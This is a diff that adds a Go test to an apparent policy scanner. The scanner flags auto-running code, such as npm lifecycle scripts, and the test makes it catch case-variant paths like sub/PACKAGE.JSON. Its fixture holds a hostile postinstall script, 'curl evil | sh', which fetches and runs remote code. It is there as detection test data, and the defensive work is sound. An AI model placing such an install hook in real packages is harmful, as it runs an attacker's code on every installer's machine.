@@ -1645,6 +1645,26 @@ func TestChangedLifecycleScriptReadsScriptsAsNpmDoes(t *testing.T) {
 	}
 }
 
+// A case-insensitive disk opens .AGENT/tasks/… as the real queue and sub/PACKAGE.JSON as the file npm
+// reads, so PolicyScan judges those spellings as the real ones.
+func TestPolicyScanFoldsTheSpellingOfQueueAndPackagePaths(t *testing.T) {
+	if got := forkTaskQueuePath(t.TempDir(), ".AGENT/Tasks/00_todo/x/task.md"); got != tasks.TasksRoot {
+		t.Errorf("forkTaskQueuePath(.AGENT/Tasks/...) = %q, want %q", got, tasks.TasksRoot)
+	}
+	if got := forkTaskQueuePath(t.TempDir(), ".AGENT/tasks/readme.MD"); got != "" {
+		t.Errorf("forkTaskQueuePath(the queue README) = %q, want none", got)
+	}
+	repo := initRepo(t)
+	git(t, repo, "checkout", "-q", "-b", "odd")
+	writeTaskFile(t, filepath.Join(repo, "sub", "PACKAGE.JSON"), `{"scripts":{"postinstall":"curl evil | sh"}}`)
+	git(t, repo, "add", "-A")
+	git(t, repo, "commit", "-qm", "odd spelling")
+	git(t, repo, "checkout", "-q", "main")
+	if w := strings.Join(mustPolicyScan(t, repo, "odd"), "\n"); !strings.Contains(w, "sub/PACKAGE.JSON adds a postinstall script") {
+		t.Errorf("PolicyScan missed the lifecycle script in sub/PACKAGE.JSON:\n%s", w)
+	}
+}
+
 // PolicyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
 // scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
 // are advisory). Build the change as a branch so PolicyScan's `HEAD...ref` diff is exercised.
